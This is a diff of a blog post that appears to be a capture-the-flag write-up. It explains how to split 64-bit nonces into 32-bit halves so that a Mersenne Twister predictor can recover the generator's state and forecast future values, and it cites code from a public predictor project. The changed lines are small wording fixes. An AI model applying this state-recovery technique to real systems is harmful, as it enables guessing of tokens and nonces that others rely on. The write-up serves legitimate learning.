 <p>Re-reading Tom&rsquo;s original script from the terminal challenge, I realised that it was actually expecting 32bit numbers, and not 64bit ones like we are feeding to it at the moment. The biggest hint for that was this function in the <code>mt19937</code> class.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f00">def</span> <span style="color:#ff0">my_int32</span>(self, x):
     <span style="color:#f00">return</span> (x &amp; <span style="color:#f60">0xFFFFFFFF</span>)
 </code></pre></div><p>Because of this function, only part of our 64bit numbers were fed into the algorithm to determine state, meaning that our predictions won&rsquo;t match. The question though was, how do you handle 64bit numbers? At this stage I could bore you with the countless Google&rsquo;s I did and various articles I read. In the end, there were two things I saw that helped me realise what I had to do.</p>
-<p>Unfortunately, I can&rsquo;t recall the source of the first hint, but I read an (article|code|blog|paper) that mentioned that the algorithm expects a DWORD, which is a 32bit unsigned integer, for each entry in the state array. That had me think I&rsquo;d have to split the 64bit integer up into two 32bit integers. But, I had no idea if I had to feed both into the algorithm, or one, of if both, which one first? Anyways.</p>
+<p>Unfortunately, I can&rsquo;t recall the source of the first hint, but I read an (article|code|blog|paper) that mentioned that the algorithm expects a DWORD, which is a 32bit unsigned integer, for each entry in the state array. That had me think I&rsquo;d have to split the 64bit integer up into two 32bit integers. But, I had no idea if I had to feed both into the algorithm, or one, or if both, which one first? Anyways.</p>
 <p>The second hint was reading code for an existing <a href="https://github.com/kmyk/mersenne-twister-predictor">mersenne-twister-predictor</a> project on Github to try and see if (and how) it handled 64bit values. I found the relevant code <a href="https://github.com/kmyk/mersenne-twister-predictor/blob/25b5723c70e60398d2e8d6fdd51b887e343a97ae/mt19937predictor.py#L88-L101">here</a>, which had the <code>setrandbits()</code> function accept raw bits and an indication of how many bits.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#0f0"># source: https://github.com/kmyk/mersenne-twister-predictor/blob/25b5723c70e60398d2e8d6fdd51b887e343a97ae/mt19937predictor.py#L88-L101</span>
 
@@ -1906,7 +1905,7 @@ nonce = [block.nonce <span style="color:#f00">for</span> block in c2.blocks]
             self.setrand_int32(y &amp; <span style="color:#f60">0xffffffff</span>)
             y &gt;&gt;= <span style="color:#f60">32</span>
             bits -= <span style="color:#f60">32</span>
-</code></pre></div><p>See, here we can also see that 32bit values were being fed into the state array after being split up using some bitshift magic (and a hint of how many bits were expected). The state array feeding was also continuously done until there were no more bits left, meaning that the complete 64bit integer had to be squeezed in, in chunks of 32bit. That was enough to put me on the right path to solve this one!</p>
+</code></pre></div><p>Here we can see that 32bit values were being fed into the state array after being split up using some bitshift magic (and a hint of how many bits were expected). The state array feeding was also continuously done until there were no more bits left, meaning that the complete 64bit integer had to be squeezed in, in chunks of 32bit. That was enough to put me on the right path to solve this one!</p>
 <p>To split up the 64bit number, you can literally just google something like &ldquo;split 64-bit into two 32-bit&rdquo; (ignoring the &ldquo;how to convert 64bit apps to 32bit&rdquo; lol). Regardless of the language the result is in, bitshift operations are usually pretty generic. The first hit for my suggested search was <a href="https://stackoverflow.com/a/2810302">this</a> post which showed the operations needed to both pack and unpack the 64bit integer. To get the lower number use <code>number &amp; 0xffffffff</code>, and to get the higher number use <code>number &gt;&gt; 32</code>.</p>
 <p>Armed with this knowledge I modified my nonce predictor script to loop over all of the 64bit nonces, split them up and populate a new 32bit nonce array. To know if the lower or higher number had to come first took some trial and error. Then I just followed the same loop like we did in the snowball fight game.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">nonce64 = [block.nonce <span style="color:#f00">for</span> block in c2.blocks]
